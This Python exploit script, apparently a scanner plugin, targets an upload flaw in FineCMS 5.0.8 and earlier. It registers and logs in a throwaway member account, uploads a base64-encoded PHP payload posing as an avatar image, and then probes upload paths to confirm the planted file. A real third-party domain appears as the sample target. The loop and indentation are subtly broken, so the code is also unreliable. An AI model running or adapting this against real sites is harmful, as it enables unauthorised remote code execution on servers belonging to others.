#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: finecms-5.0.8-getshell漏洞
referer: unknown
author: qianxiao996
description: finecms5.0.8及版本以下漏洞Getshell脚本
'''
import sys
import requests
import random
import warnings
sys.path.append('../../')
from color import *
#方法名称自定义
class finecms_508_getshell:
	def __init__(self, url):
		self.url = url
	def run(self):
		#此处编辑检测代码
		#示例代码，请尽量使用彩色字体 printGreen、 printBlue、printYellow函数
		headers = {
			"User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
		}
		username=random.randint(0,999999)
		seed = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
		email = []
		for i in range(8):
			email.append(random.choice(seed))
			email = ''.join(email)
			#print email+"@"+email+".com"
			#print username
			#step 1 register
			#print "[+] register user"
			register_url=self.url+"/index.php?s=member&c=register&m=index"
			register_payload={"back":"","data[username]":username,"data[password]":"123456","data[password2]":"123456","data[email]":email+"@"+email+".com"}
			#step 2 login
			#print "[+] user login"
			login_url=self.url+"/index.php?s=member&c=login&m=index"
			login_payload={"back":"","data[username]":username,"data[password]":"123456","data[auto]":"1"}
			#step 3 attack
			#print "[+] loading payload"
			vul_url=self.url+"/index.php?s=member&c=account&m=upload"
			vul_payload={"tx":"data:image/php;base64,NDA0bm90Zm91bmQ8P3BocCBwaHBpbmZvKCk7Pz4="}
			try:
				s = requests.session()
				resu=s.post(register_url,data=register_payload,timeout=5,headers=headers, verify=False)
				result=s.post(login_url,data=login_payload,timeout=5,headers=headers, verify=False)
				result2=s.post(vul_url,data=vul_payload,timeout=5,headers=headers, verify=False).content
				if "status" in result2:
					printGreen("[+]Success:存在finecms-5.0.8-getshell漏洞")
					for i in range(0,10):
						shell = self.url+"/uploadfile/member/"+str(i)+"/0x0.php"
						shell_result = s.get(shell,timeout=5,headers=headers, verify=False)
						if shell_result.status_code==200 and 'code' in shell_result.text:
							printGreen ("[+]Success:当前shell上传位置为:%s"%shell)
							sys.exit(1)
					printBlue("[-]Info:不存在finecms-5.0.8-getshell代码执行漏洞")
					sys.exit(1)
			except:
				printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")
				sys.exit(1)
if __name__ == "__main__":
	#此处不会调用
	warnings.filterwarnings("ignore")
	testVuln = finecms_508_getshell("http://baidu.com")
	testVuln.run()


	

